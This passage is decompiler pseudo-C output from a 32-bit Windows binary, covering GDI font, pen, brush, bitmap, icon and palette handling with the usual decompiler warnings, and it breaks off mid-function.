char __usercall sub_413B5C@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>)
{
  return sub_40C02C(a1, a2, (int)&dword_41D858, 41);
}
// 41D858: using guessed type int dword_41D858;

//----- (00413D20) --------------------------------------------------------
char __usercall sub_413D20@<al>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  return sub_40C06C(a1, a2, &dword_41D9A8, 17);
}
// 41D9A8: using guessed type int dword_41D9A8;

//----- (00413D30) --------------------------------------------------------
char __usercall sub_413D30@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>)
{
  return sub_40C02C(a1, a2, (int)&dword_41D9A8, 17);
}
// 41D9A8: using guessed type int dword_41D9A8;

//----- (00413D40) --------------------------------------------------------
int __usercall sub_413D40@<eax>(int a1@<eax>)
{
  char v2; // al
  HFONT v3; // eax
  int v4; // ebx
  unsigned int v6[2]; // [esp-18h] [ebp-68h] BYREF
  int *v7; // [esp-10h] [ebp-60h]
  unsigned int v8[2]; // [esp-Ch] [ebp-5Ch] BYREF
  int *v9; // [esp-4h] [ebp-54h]
  char *v10; // [esp+4h] [ebp-4Ch] BYREF
  char *v11; // [esp+8h] [ebp-48h] BYREF
  char *v12; // [esp+Ch] [ebp-44h] BYREF
  LOGFONTA lf; // [esp+10h] [ebp-40h] BYREF
  int v14; // [esp+4Ch] [ebp-4h]
  int savedregs; // [esp+50h] [ebp+0h] BYREF

  v10 = 0;
  v11 = 0;
  v12 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_413EC9;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v14 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v14 + 8) )
  {
    sub_4137CC(dword_41E6C0);
    v7 = &savedregs;
    v6[1] = (unsigned int)&loc_413EA1;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    if ( !*(_DWORD *)(v14 + 8) )
    {
      lf.lfHeight = *(_DWORD *)(v14 + 20);
      memset(&lf.lfWidth, 0, 12);
      if ( (*(_BYTE *)(v14 + 25) & 1) != 0 )
        lf.lfWeight = 700;
      else
        lf.lfWeight = 400;
      lf.lfItalic = (*(_BYTE *)(v14 + 25) & 2) != 0;
      lf.lfUnderline = (*(_BYTE *)(v14 + 25) & 4) != 0;
      lf.lfStrikeOut = (*(_BYTE *)(v14 + 25) & 8) != 0;
      lf.lfCharSet = *(_BYTE *)(v14 + 26);
      sub_4036EC(&v12, (char *)(v14 + 27));
      if ( sub_406E64(v12, "Default") )
      {
        sub_4036EC(&v10, (char *)(v14 + 27));
        sub_4075BC(lf.lfFaceName, v10);
      }
      else
      {
        sub_4036EC(&v11, aMsSansSerif);
        sub_4075BC(lf.lfFaceName, v11);
      }
      lf.lfQuality = 0;
      lf.lfOutPrecision = 0;
      lf.lfClipPrecision = 0;
      v2 = sub_413EE8(a1) - 1;
      if ( v2 )
        lf.lfPitchAndFamily = v2 == 1;
      else
        lf.lfPitchAndFamily = 2;
      v3 = CreateFontIndirectA(&lf);
      *(_DWORD *)(v14 + 8) = v3;
    }
    __writefsdword(0, v6[0]);
    v7 = (int *)&loc_413EA8;
    sub_4137D8(dword_41E6C0);
  }
  v4 = *(_DWORD *)(v14 + 8);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_413ED0;
  sub_4034EC((int)&v10, 3);
  return v4;
}
// 41E6C0: using guessed type int dword_41E6C0;

//----- (00413EE8) --------------------------------------------------------
char __usercall sub_413EE8@<al>(int a1@<eax>)
{
  return *(_BYTE *)(*(_DWORD *)(a1 + 16) + 24);
}

//----- (00413EF0) --------------------------------------------------------
int __usercall sub_413EF0@<eax>(int a1@<eax>)
{
  HPEN v1; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v4; // [esp-4h] [ebp-18h]
  LOGPEN plpen; // [esp+0h] [ebp-14h] BYREF
  int v6; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v6 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v6 + 8) )
  {
    sub_4137CC(dword_41E6C4);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_413F76;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    if ( !*(_DWORD *)(v6 + 8) )
    {
      plpen.lopnStyle = (unsigned __int16)word_41DA38[*(unsigned __int8 *)(v6 + 28)];
      plpen.lopnWidth.x = *(_DWORD *)(v6 + 24);
      plpen.lopnColor = sub_413B3C(*(_DWORD *)(v6 + 20));
      v1 = CreatePenIndirect(&plpen);
      *(_DWORD *)(v6 + 8) = v1;
    }
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_413F7D;
    sub_4137D8(dword_41E6C4);
  }
  return *(_DWORD *)(v6 + 8);
}
// 41DA38: using guessed type __int16 word_41DA38[8];
// 41E6C4: using guessed type int dword_41E6C4;

//----- (00413F88) --------------------------------------------------------
int __usercall sub_413F88@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 16) + 20);
}

//----- (00413F90) --------------------------------------------------------
int __usercall sub_413F90@<eax>(int a1@<eax>)
{
  int v1; // eax
  char v2; // al
  HBRUSH v3; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v6; // [esp-8h] [ebp-18h]
  int *v7; // [esp-4h] [ebp-14h]
  LOGBRUSH plbrush; // [esp+0h] [ebp-10h] BYREF
  int v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v9 + 8) )
  {
    sub_4137CC(dword_41E6C8);
    v7 = &savedregs;
    v6 = &loc_41405D;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( !*(_DWORD *)(v9 + 8) )
    {
      v1 = *(_DWORD *)(v9 + 24);
      if ( v1 )
      {
        (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, int))(*(_DWORD *)v1 + 104))(
          ExceptionList,
          v6,
          v7,
          3);
        plbrush.lbHatch = (*(int (**)(void))(**(_DWORD **)(v9 + 24) + 96))();
      }
      else
      {
        plbrush.lbHatch = 0;
        v2 = *(_BYTE *)(v9 + 28);
        if ( v2 )
        {
          if ( v2 == 1 )
          {
            plbrush.lbStyle = 1;
          }
          else
          {
            plbrush.lbStyle = 2;
            plbrush.lbHatch = (v2 & 0x7F) - 2;
          }
        }
        else
        {
          plbrush.lbStyle = 0;
        }
      }
      plbrush.lbColor = sub_413B3C(*(_DWORD *)(v9 + 20));
      v3 = CreateBrushIndirect(&plbrush);
      *(_DWORD *)(v9 + 8) = v3;
    }
    __writefsdword(0, (unsigned int)ExceptionList);
    v7 = (int *)&loc_414064;
    sub_4137D8(dword_41E6C8);
  }
  return *(_DWORD *)(v9 + 8);
}
// 41E6C8: using guessed type int dword_41E6C8;

//----- (00414070) --------------------------------------------------------
char __usercall sub_414070@<al>(int a1@<eax>)
{
  return *(_BYTE *)(*(_DWORD *)(a1 + 16) + 28);
}

//----- (00414078) --------------------------------------------------------
void __usercall sub_414078(int a1@<eax>)
{
  EnterCriticalSection_0(&stru_41E6A8);
  ++*(_DWORD *)(a1 + 80);
  LeaveCriticalSection_0(&stru_41E6A8);
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 56));
}

//----- (004140A0) --------------------------------------------------------
BOOL __usercall sub_4140A0@<eax>(int y@<ecx>, int x@<edx>, int a3@<eax>)
{
  sub_414244(a3, 1, y);
  return MoveToEx(*(HDC *)(a3 + 4), x, y, 0);
}

//----- (004140CC) --------------------------------------------------------
bool __usercall sub_4140CC@<al>(int a1@<eax>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  bool v5; // [esp+7h] [ebp-1h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  EnterCriticalSection_0(&stru_41E6A8);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_414118;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v5 = *(_DWORD *)(a1 + 80) == 0;
  if ( v5 )
    sub_414078(a1);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_41411F;
  LeaveCriticalSection_0(&stru_41E6A8);
  return v5;
}

//----- (00414128) --------------------------------------------------------
void __usercall sub_414128(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 56));
  EnterCriticalSection_0(&stru_41E6A8);
  --*(_DWORD *)(a1 + 80);
  LeaveCriticalSection_0(&stru_41E6A8);
}

//----- (00414150) --------------------------------------------------------
BOOL __usercall sub_414150@<eax>(int a1@<eax>, struct tagPOINT *a2@<edx>, DWORD a3@<ecx>)
{
  sub_414244(a1, 1, a3);
  return GetCurrentPositionEx(*(HDC *)(a1 + 4), a2);
}

//----- (00414174) --------------------------------------------------------
BOOL __usercall sub_414174@<eax>(int a1@<eax>, int *a2@<edx>)
{
  return sub_4140A0(a2[1], *a2, a1);
}

//----- (00414194) --------------------------------------------------------
char __usercall sub_414194@<al>(int a1@<eax>)
{
  int v1; // ebx
  HDC v2; // esi

  v1 = a1;
  v2 = *(HDC *)(a1 + 4);
  if ( v2 )
  {
    LOBYTE(a1) = *(_BYTE *)(a1 + 8) & 0xF1;
    if ( *(_BYTE *)(v1 + 8) != (_BYTE)a1 )
    {
      SelectObject(v2, h);
      SelectObject(*(HDC *)(v1 + 4), dword_41E684);
      SelectObject(*(HDC *)(v1 + 4), dword_41E688);
      LOBYTE(a1) = *(_BYTE *)(v1 + 8) & 0xF1;
      *(_BYTE *)(v1 + 8) = a1;
    }
  }
  return a1;
}

//----- (004141F0) --------------------------------------------------------
int __usercall sub_4141F0@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax
  DWORD v5; // ecx
  struct tagPOINT v6; // [esp+0h] [ebp-10h] BYREF

  result = *(_DWORD *)(a1 + 4);
  if ( a2 != result )
  {
    if ( result )
    {
      sub_414194(a1);
      sub_414150(a1, &v6, v5);
      *(struct tagPOINT *)(a1 + 24) = v6;
      result = 0;
      *(_DWORD *)(a1 + 4) = 0;
      *(_BYTE *)(a1 + 8) &= ~1u;
    }
    if ( a2 )
    {
      *(_BYTE *)(a1 + 8) |= 1u;
      *(_DWORD *)(a1 + 4) = a2;
      return sub_414174(a1, (int *)(a1 + 24));
    }
  }
  return result;
}
// 41420F: variable 'v5' is possibly undefined

//----- (00414244) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_414244@<eax>(int result@<eax>, char a2@<dl>, DWORD a3@<ecx>)
{
  int v3; // esi
  char v4; // bl
  DWORD v6; // [esp-Ch] [ebp-18h]
  DWORD v7; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v8; // [esp-4h] [ebp-10h]

  LOBYTE(a3) = a2;
  v3 = result;
  v4 = a2 & ~*(_BYTE *)(result + 8);
  LOBYTE(result) = 0;
  if ( v4 )
  {
    if ( (v4 & 1) != 0 )
    {
      result = (*(int (**)(void))(*(_DWORD *)v3 + 20))();
      if ( !*(_DWORD *)(v3 + 4) )
      {
        sub_40950C((int)dword_40B8A8, 1, off_41DB60[0]);
        sub_402F98(a3, v6, v7, v8);
      }
    }
    if ( (v4 & 2) != 0 )
      result = sub_4142B8(v3);
    if ( (v4 & 4) != 0 )
      result = sub_4142E4(v3);
    if ( (v4 & 8) != 0 )
      result = sub_414314(v3);
    *(_BYTE *)(v3 + 8) |= v4;
  }
  return result;
}
// 4142B3: positive sp value 10 has been found
// 414281: variable 'v6' is possibly undefined
// 414281: variable 'v7' is possibly undefined
// 414281: variable 'v8' is possibly undefined
// 40B8A8: using guessed type int dword_40B8A8[5];
// 41DB60: using guessed type int **off_41DB60[36];

//----- (004142B8) --------------------------------------------------------
COLORREF __usercall sub_4142B8@<eax>(int a1@<eax>)
{
  void *v2; // eax
  signed int v3; // eax

  v2 = (void *)sub_413D40(*(_DWORD *)(a1 + 12));
  SelectObject(*(HDC *)(a1 + 4), v2);
  v3 = sub_413B3C(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 24));
  return SetTextColor(*(HDC *)(a1 + 4), v3);
}

//----- (004142E4) --------------------------------------------------------
int __usercall sub_4142E4@<eax>(int a1@<eax>)
{
  void *v2; // eax

  v2 = (void *)sub_413EF0(*(_DWORD *)(a1 + 16));
  SelectObject(*(HDC *)(a1 + 4), v2);
  return SetROP2(*(HDC *)(a1 + 4), (unsigned __int16)word_41DA48[*(unsigned __int8 *)(*(_DWORD *)(a1 + 16) + 24)]);
}
// 41DA48: using guessed type __int16 word_41DA48[16];

//----- (00414314) --------------------------------------------------------
int __usercall sub_414314@<eax>(int a1@<eax>)
{
  void *v2; // eax
  void *v3; // eax
  int v4; // eax
  signed int v5; // eax
  int v7; // eax
  signed int v8; // eax

  v2 = (void *)sub_413F90(*(_DWORD *)(a1 + 20));
  UnrealizeObject(v2);
  v3 = (void *)sub_413F90(*(_DWORD *)(a1 + 20));
  SelectObject(*(HDC *)(a1 + 4), v3);
  if ( sub_414070(*(_DWORD *)(a1 + 20)) )
  {
    v7 = sub_413F88(*(_DWORD *)(a1 + 20));
    v8 = sub_413B3C(v7);
    SetBkColor(*(HDC *)(a1 + 4), ~v8);
    return SetBkMode(*(HDC *)(a1 + 4), 1);
  }
  else
  {
    v4 = sub_413F88(*(_DWORD *)(a1 + 20));
    v5 = sub_413B3C(v4);
    SetBkColor(*(HDC *)(a1 + 4), v5);
    return SetBkMode(*(HDC *)(a1 + 4), 2);
  }
}

//----- (00414390) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_414390(int **a1@<eax>)
{
  DWORD v1; // [esp-10h] [ebp-14h]
  DWORD v2; // [esp-Ch] [ebp-10h]
  DWORD v3; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v4; // [esp-4h] [ebp-8h]

  sub_40950C((int)dword_413460, 1, a1);
  sub_402F98(v1, v2, v3, v4);
}
// 4143A7: positive sp value 10 has been found
// 4143A1: variable 'v1' is possibly undefined
// 4143A1: variable 'v2' is possibly undefined
// 4143A1: variable 'v3' is possibly undefined
// 4143A1: variable 'v4' is possibly undefined
// 413460: using guessed type int dword_413460[7];

//----- (004143A8) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_4143A8(int **a1@<eax>)
{
  DWORD v1; // [esp-10h] [ebp-14h]
  DWORD v2; // [esp-Ch] [ebp-10h]
  DWORD v3; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v4; // [esp-4h] [ebp-8h]

  sub_40950C((int)dword_413404, 1, a1);
  sub_402F98(v1, v2, v3, v4);
}
// 4143BF: positive sp value 10 has been found
// 4143B9: variable 'v1' is possibly undefined
// 4143B9: variable 'v2' is possibly undefined
// 4143B9: variable 'v3' is possibly undefined
// 4143B9: variable 'v4' is possibly undefined
// 413404: using guessed type int dword_413404[4];

//----- (004143C0) --------------------------------------------------------
void sub_4143C0()
{
  sub_4143A8(off_41DB44);
}
// 41DB44: using guessed type int **off_41DB44;

//----- (004143CC) --------------------------------------------------------
void sub_4143CC()
{
  sub_4143A8(off_41DB4C[0]);
}
// 41DB4C: using guessed type int **off_41DB4C[2];

//----- (004143D8) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
_DWORD *sub_4143D8()
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-1Ch] [ebp-20h] BYREF
  DWORD v2; // [esp-18h] [ebp-1Ch]
  int *v3; // [esp-14h] [ebp-18h]
  const ULONG_PTR *v4; // [esp-10h] [ebp-14h]
  unsigned int v5; // [esp-Ch] [ebp-10h]
  void *v6; // [esp-4h] [ebp-8h]
  char *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = 0;
  v3 = &savedregs;
  v2 = (DWORD)&loc_414422;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_404B80(off_41DAF0[0], &v7);
  sub_409450((int)dword_40B84C, 1, (__int32)v7);
  sub_402F98((DWORD)ExceptionList, v2, (DWORD)v3, v4);
  __writefsdword(0, v5);
  v6 = &loc_414429;
  return sub_4034C8(&v7);
}
// 41442B: positive sp value 10 has been found
// 40B84C: using guessed type int dword_40B84C[4];
// 41DAF0: using guessed type int **off_41DAF0[5];

//----- (0041442C) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *sub_41442C()
{
  DWORD LastError_0; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-114h] BYREF
  DWORD v3; // [esp-8h] [ebp-110h]
  int *v4; // [esp-4h] [ebp-10Ch]
  const ULONG_PTR *v5; // [esp+0h] [ebp-108h]
  char *v6; // [esp+4h] [ebp-104h] BYREF
  char Buffer[4]; // [esp+8h] [ebp-100h] BYREF
  void *v8; // [esp+Ch] [ebp-FCh]
  int savedregs; // [esp+108h] [ebp+0h] BYREF

  v6 = 0;
  v4 = &savedregs;
  v3 = (DWORD)&loc_4144C8;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LastError_0 = GetLastError_0();
  if ( LastError_0 && FormatMessageA(0x1000u, 0, LastError_0, 0x400u, Buffer, 0x100u, 0) )
  {
    sub_4036F8(&v6, Buffer, 256);
    sub_409450((int)dword_40B84C, 1, (__int32)v6);
    sub_402F98((DWORD)ExceptionList, v3, (DWORD)v4, v5);
  }
  else
  {
    sub_4143D8();
  }
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_4144CF;
  return sub_4034C8(&v6);
}
// 4144C2: bad sp value at call
// 40B84C: using guessed type int dword_40B84C[4];
// 41442C: using guessed type CHAR Buffer[4];

//----- (004144D4) --------------------------------------------------------
int __usercall sub_4144D4@<eax>(int a1@<eax>)
{
  if ( !a1 )
    sub_41442C();
  return a1;
}

//----- (004144E4) --------------------------------------------------------
HGDIOBJ __usercall sub_4144E4@<eax>(void *a1@<eax>, int *a2@<edx>, char a3@<cl>)
{
  HGDIOBJ v4; // ebx
  HGDIOBJ v5; // esi
  unsigned int v7[2]; // [esp-18h] [ebp-58h] BYREF
  int *v8; // [esp-10h] [ebp-50h]
  unsigned int v9[2]; // [esp-Ch] [ebp-4Ch] BYREF
  int *v10; // [esp-4h] [ebp-44h]
  char pv[4]; // [esp+Ch] [ebp-34h] BYREF
  int wSrc; // [esp+10h] [ebp-30h]
  int hSrc; // [esp+14h] [ebp-2Ch]
  HDC hdcDest; // [esp+24h] [ebp-1Ch]
  HDC hdcSrc; // [esp+28h] [ebp-18h]
  HDC hdc; // [esp+2Ch] [ebp-14h]
  HGDIOBJ Bitmap; // [esp+30h] [ebp-10h]
  int nWidth; // [esp+34h] [ebp-Ch]
  int nHeight; // [esp+38h] [ebp-8h]
  HANDLE h; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  nWidth = *a2;
  nHeight = a2[1];
  h = a1;
  hdcSrc = CreateCompatibleDC(0);
  hdcDest = CreateCompatibleDC(0);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_414632;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  GetObjectA(h, 24, pv);
  if ( a3 )
  {
    Bitmap = CreateBitmap(nWidth, nHeight, 1u, 1u, 0);
  }
  else
  {
    hdc = GetDC(0);
    if ( !hdc )
      sub_41442C();
    v8 = &savedregs;
    v7[1] = (unsigned int)&loc_4145A1;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    Bitmap = CreateCompatibleBitmap(hdc, nWidth, nHeight);
    if ( !Bitmap )
      sub_41442C();
    __writefsdword(0, v7[0]);
    v8 = (int *)&loc_4145A8;
    ReleaseDC(0, hdc);
  }
  if ( Bitmap )
  {
    v4 = SelectObject(hdcSrc, h);
    v5 = SelectObject(hdcDest, Bitmap);
    StretchBlt(hdcDest, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u);
    if ( v4 )
      SelectObject(hdcSrc, v4);
    if ( v5 )
      SelectObject(hdcDest, v5);
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_414639;
  DeleteDC(hdcSrc);
  DeleteDC(hdcDest);
  return Bitmap;
}
// 4144E4: using guessed type char pv[4];

//----- (00414644) --------------------------------------------------------
int __usercall sub_414644@<eax>(__int16 a1@<ax>)
{
  if ( a1 == 1 || a1 == 4 || a1 == 8 )
    return 1 << a1;
  else
    return 0;
}

//----- (00414664) --------------------------------------------------------
int __usercall sub_414664@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  return (~(a3 - 1) & (a3 - 1 + a2 * a1)) / 8;
}

//----- (00414678) --------------------------------------------------------
HPALETTE __usercall sub_414678@<eax>(char *a1@<eax>)
{
  int DeviceCaps; // ebx
  struct tagPALETTEENTRY v3; // [esp+0h] [ebp-424h] BYREF
  tagPALETTEENTRY v4[4]; // [esp+4h] [ebp-420h] BYREF
  int *v5; // [esp+14h] [ebp-410h]
  LOGPALETTE plpal; // [esp+1Ch] [ebp-408h] BYREF
  struct tagPALETTEENTRY v7; // [esp+3Ch] [ebp-3E8h] BYREF
  struct tagPALETTEENTRY v8; // [esp+40h] [ebp-3E4h] BYREF
  HDC hdc; // [esp+420h] [ebp-4h]
  int savedregs; // [esp+424h] [ebp+0h] BYREF

  plpal.palVersion = 768;
  plpal.palNumEntries = 16;
  sub_4026B0(a1, (char *)plpal.palPalEntry, 64);
  hdc = GetDC(0);
  v5 = &savedregs;
  v4[3] = (tagPALETTEENTRY)sub_414775;
  v4[2] = (tagPALETTEENTRY)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v4[2]);
  DeviceCaps = GetDeviceCaps(hdc, 104);
  if ( DeviceCaps >= 16 )
  {
    GetSystemPaletteEntries(hdc, 0, 8u, plpal.palPalEntry);
    if ( v7 == 12632256 )
    {
      GetSystemPaletteEntries(hdc, DeviceCaps - 8, 1u, &v7);
      GetSystemPaletteEntries(hdc, DeviceCaps - 7, 7u, &v4[plpal.palNumEntries]);
      GetSystemPaletteEntries(hdc, 7u, 1u, &v8);
    }
    else
    {
      GetSystemPaletteEntries(hdc, DeviceCaps - 8, 8u, &v3 + plpal.palNumEntries);
    }
  }
  __writefsdword(0, *(_DWORD *)&v4[2]);
  v5 = (int *)&loc_41477C;
  ReleaseDC(0, hdc);
  return CreatePalette(&plpal);
}
// 414678: using guessed type struct tagPALETTEENTRY var_420[4];

//----- (00414790) --------------------------------------------------------
int __userpurge sub_414790@<eax>(
        BITMAPINFOHEADER *a1@<eax>,
        HGDIOBJ *a2@<edx>,
        struct _EXCEPTION_REGISTRATION_RECORD *a3@<ecx>,
        int *a4)
{
  int v5; // esi
  HBITMAP DIBitmap; // eax
  int v7; // eax
  BITMAPINFOHEADER *v8; // eax
  HBITMAP v9; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v10; // eax
  unsigned int v12[2]; // [esp-18h] [ebp-38h] BYREF
  _DWORD **v13; // [esp-10h] [ebp-30h]
  _DWORD v14[6]; // [esp-Ch] [ebp-2Ch] BYREF
  void *pjBits; // [esp+Ch] [ebp-14h]
  HDC hdc; // [esp+10h] [ebp-10h]
  HGDIOBJ ho; // [esp+14h] [ebp-Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+18h] [ebp-8h] BYREF
  BITMAPINFOHEADER *pbmih; // [esp+1Ch] [ebp-4h]
  _DWORD *savedregs; // [esp+20h] [ebp+0h] BYREF

  ExceptionList = a3;
  pbmih = a1;
  a1->biHeight = (unsigned int)a1->biHeight >> 1;
  pbmih->biSizeImage = pbmih->biHeight * sub_414664(pbmih->biWidth, pbmih->biBitCount, 32);
  v5 = sub_414644(pbmih->biBitCount);
  hdc = GetDC(0);
  if ( !hdc )
    sub_4143D8();
  v14[2] = &savedregs;
  v14[1] = &loc_41493C;
  v14[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  pjBits = &pbmih[1].biSize + v5;
  DIBitmap = CreateDIBitmap(hdc, pbmih, 4u, pjBits, (const BITMAPINFO *)pbmih, 0);
  ho = (HGDIOBJ)sub_4144D4((int)DIBitmap);
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_414862;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  *a2 = sub_4144E4(ho, a4, 0);
  __writefsdword(0, v12[0]);
  v13 = (_DWORD **)&loc_414869;
  DeleteObject(ho);
  pjBits = (char *)pjBits + pbmih->biSizeImage;
  pbmih->biBitCount = 1;
  v7 = sub_414664(pbmih->biWidth, 1, 32);
  pbmih->biSizeImage = pbmih->biHeight * v7;
  pbmih->biClrUsed = 2;
  pbmih->biClrImportant = 2;
  v8 = pbmih + 1;
  pbmih[1].biSize = 0;
  v8->biWidth = 0xFFFFFF;
  v9 = CreateDIBitmap((HDC)pbmih, pbmih, 4u, pjBits, (const BITMAPINFO *)pbmih, 0);
  ho = (HGDIOBJ)sub_4144D4((int)v9);
  savedregs = &savedregs;
  pbmih = (BITMAPINFOHEADER *)&loc_41491C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v10 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_4144E4(ho, a4, 1);
  ExceptionList->Next = v10;
  __writefsdword(0, (unsigned int)ExceptionList);
  savedregs = &loc_414923;
  DeleteObject(ho);
  __writefsdword(0, (unsigned int)ExceptionList);
  savedregs = &loc_414943;
  return ReleaseDC(0, hdc);
}

//----- (0041494C) --------------------------------------------------------
int __usercall sub_41494C@<eax>(int result@<eax>)
{
  if ( !result )
    return 0x7FFFFFFF;
  return result;
}

//----- (00414958) --------------------------------------------------------
bool __usercall sub_414958@<al>(unsigned __int8 *a1@<eax>, unsigned __int8 *a2@<edx>, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // ebx
  int v6; // esi
  int v8; // [esp+Ch] [ebp-8h]

  v3 = **(_DWORD **)(a3 + 8);
  v4 = *a2 - v3;
  v5 = a2[1] - *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4);
  v6 = *a1 - v3;
  v8 = a1[1] - *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4);
  return (int)abs32(v4) <= (int)abs32(v6)
      && (v4 <= 0 || v6 >= v4)
      && (int)abs32(v5) <= (int)abs32(v8)
      && (v5 <= 0 || v5 <= v8);
}

//----- (004149E8) --------------------------------------------------------
int __userpurge sub_4149E8@<eax>(int a1@<eax>, HICON *a2@<edx>, int a3@<ecx>, int *a4, int *a5, int a6)
{
  __int16 DeviceCaps; // bx
  unsigned __int16 v7; // bx
  int v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // ebx
  int v12; // ecx
  BITMAPINFOHEADER *v13; // ebx
  LONG v14; // ebx
  const BYTE *v15; // edi
  char *v16; // esi
  HICON Icon; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-88h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v20; // [esp-8h] [ebp-84h] BYREF
  int *v21; // [esp-4h] [ebp-80h]
  int *v22; // [esp+0h] [ebp-7Ch]
  char pv[8]; // [esp+Ch] [ebp-70h] BYREF
  int v24; // [esp+14h] [ebp-68h]
  int v25; // [esp+18h] [ebp-64h]
  unsigned __int16 v26; // [esp+1Ch] [ebp-60h]
  char v27[8]; // [esp+24h] [ebp-58h] BYREF
  int v28; // [esp+2Ch] [ebp-50h]
  int v29; // [esp+30h] [ebp-4Ch]
  unsigned __int16 v30; // [esp+34h] [ebp-48h]
  BYTE v31; // [esp+36h] [ebp-46h]
  char *v32; // [esp+3Ch] [ebp-40h]
  LONG cb; // [esp+40h] [ebp-3Ch]
  struct _EXCEPTION_REGISTRATION_RECORD h; // [esp+44h] [ebp-38h] BYREF
  LPVOID lpvBits; // [esp+4Ch] [ebp-30h]
  char *v36; // [esp+50h] [ebp-2Ch]
  HDC hdc; // [esp+54h] [ebp-28h]
  int v38; // [esp+58h] [ebp-24h]
  int v39; // [esp+5Ch] [ebp-20h]
  int v40; // [esp+60h] [ebp-1Ch]
  int v41; // [esp+64h] [ebp-18h]
  int v42; // [esp+68h] [ebp-14h]
  char *v43; // [esp+6Ch] [ebp-10h]
  int v44; // [esp+70h] [ebp-Ch]
  HICON *v45; // [esp+74h] [ebp-8h]
  int v46; // [esp+78h] [ebp-4h]
  int savedregs; // [esp+7Ch] [ebp+0h] BYREF

  v44 = a3;
  v45 = a2;
  v46 = a1;
  v42 = 16 * a3;
  v43 = sub_406D34(16 * a3);
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_414CDF;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(*(_DWORD *)v46 + 4))(
    v42,
    v43,
    ExceptionList,
